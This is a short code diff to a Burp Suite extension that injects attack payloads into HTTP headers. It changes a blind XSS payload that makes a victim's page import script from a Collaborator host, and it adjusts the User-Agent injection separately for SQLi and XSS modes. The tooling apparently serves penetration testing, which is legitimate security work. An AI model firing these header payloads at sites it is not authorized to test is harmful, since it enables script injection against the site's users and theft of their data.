@@ -272,7 +272,7 @@ public class BurpHeaderBanger implements BurpExtension, ProxyRequestHandler, Pro
     private void initializeCollaboratorPayload() {
         if (bxssPayload.isEmpty()) {
             CollaboratorPayload payload = collaboratorClient.generatePayload();
-            bxssPayload = "\"><img/src/onerror=import('//" + payload.toString() + "')>";
+            bxssPayload = "Mozilla\"><img/src/onerror=import('//" + payload.toString() + "')>";
         }
     }
 
@@ -294,7 +294,13 @@ public class BurpHeaderBanger implements BurpExtension, ProxyRequestHandler, Pro
             }
             
             if ("User-Agent".equals(header)) {
-                injectedHeaders.add("User-Agent: Mozilla/5.0" + currentPayload);
+                if (attackMode == 1) {
+                    // For SQLi, keep the Mozilla prefix
+                    injectedHeaders.add("User-Agent: Mozilla/5.0" + currentPayload);
+                } else {
+                    // For XSS, just use the payload directly
+                    injectedHeaders.add("User-Agent: " + currentPayload);
+                }
             } else {
                 injectedHeaders.add(header + ": 1" + currentPayload);
             }
